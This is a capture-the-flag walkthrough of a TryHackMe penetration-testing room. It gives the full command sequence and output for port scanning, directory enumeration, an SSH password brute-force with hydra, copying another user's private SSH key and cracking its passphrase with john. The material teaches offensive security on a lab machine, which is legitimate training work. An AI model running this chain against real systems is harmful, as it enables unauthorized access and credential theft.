# Walkthrough of *https://tryhackme.com/room/basicpentestingjt*

```
ip = 10.10.197.135
```

# Nmap check for open ports

```
nmap -sC -sV -oN
```
default scripts, check service versions, output to a file in normal format
```
# Nmap 7.91 scan initiated Mon Mar 22 21:37:12 2021 as: nmap -sC -sV -oN nmap/initial 10.10.197.135
Nmap scan report for 10.10.197.135
Host is up (0.041s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-03-22T16:40:03-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-22T20:40:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 22 21:40:06 2021 -- 1 IP address (1 host up) scanned in 174.36 seconds
```

# Gobuster enumerate directories

```
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.10.197.135
```
```
/development (Status: 301) [Size: 320] [--> http://10.10.197.135/development/]
```

# http://10.10.197.135/development/dev.txt

```

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J

```

# http://10.10.197.135/development/j.txt

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K

```

# enum4linux
ssh is open, have to check users

```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
```

# hydra

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt.gz ssh://10.10.197.135 
```

```
[22][ssh] host: 10.10.197.135   login: jan   password: armando
```
# ssh

```
ssh jan@10.10.197.135
```
```
ls -la /
[...]
drwxrwxrwt   9 root root  4096 Mar 23 03:40 tmp
[...]
```
```
scp ./linpeas.sh jan@10.10.197.135:/tmp 
```
```
/tmp/linpeas.sh
[...]
Possible private SSH keys were found!
/home/kay/.ssh/id_rsa
```
```
scp jan@10.10.197.135:/home/kay/.ssh/id_rsa ./id_rsa
jan@10.10.197.135's password: 
id_rsa 100% 3326    41.6KB/s   00:00
```
```
chmod 600 ./id_rsa
ssh -i ./id_rsa kay@10.10.197.135
Enter passphrase for key './id_rsa':
```
```
python /usr/share/john/ssh2john.py ./id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa.hash
[...]
beeswax          (./id_rsa)
```
```
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```